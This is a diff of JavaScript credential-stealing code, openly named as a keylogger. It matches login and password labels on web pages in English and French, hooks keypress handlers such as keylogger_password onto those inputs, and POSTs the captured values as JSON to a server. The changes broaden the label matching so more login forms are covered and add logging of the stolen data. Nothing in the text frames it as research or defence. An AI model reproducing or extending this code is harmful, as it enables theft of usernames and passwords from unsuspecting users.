@@ -1,8 +1,8 @@
 var keys="";
 
-var keywords = ["username", "login", "id", "identifiant", "password", "Mot de passe", "Adresse e-mail ou mobile", "Adresse e-mail ou téléphone"];
-var logs = ["username", "login", "id", "identifiant", "Adresse e-mail ou mobile", "Adresse e-mail ou téléphone"];
-var psswd = ["password", "Mot de passe"];
+var keywords = ["username", "login", "id", "<span class=\"accesskey\">I</span>dentifiant:","<span class=\"accesskey\">M</span>ot de passe:", "identifiant", "password", "Mot de passe", "Adresse e-mail ou mobile", "Adresse e-mail ou téléphone"];
+var logs = ["username", "login", "id", "<span class=\"accesskey\">I</span>dentifiant:", "identifiant", "Adresse e-mail ou mobile", "Adresse e-mail ou téléphone"];
+var psswd = ["password", "Mot de passe","<span class=\"accesskey\">M</span>ot de passe:"];
 var elemLabels = document.getElementsByTagName("label");
 var labels = [];
 var finalInputsId = [];
@@ -52,6 +52,7 @@ for (var i = input4.length - 1; i >= 0; i--) {
 	str.push("username");
 }
 
+
 for (var i = inputs.length - 1; i >= 0; i--) {
 	if(psswd.indexOf(str[i]) > -1 ){
 		inputs[i].onkeypress = keylogger_password;
@@ -98,7 +99,7 @@ function sendToServer(libelle,value){
 	}
 	else{
 		json = json + '"' + value + '"}';
-
+		console.log(json);
 		var xhr = new XMLHttpRequest();
 		xhr.open("POST", url, true);
 		xhr.setRequestHeader("Content-type", "application/json");
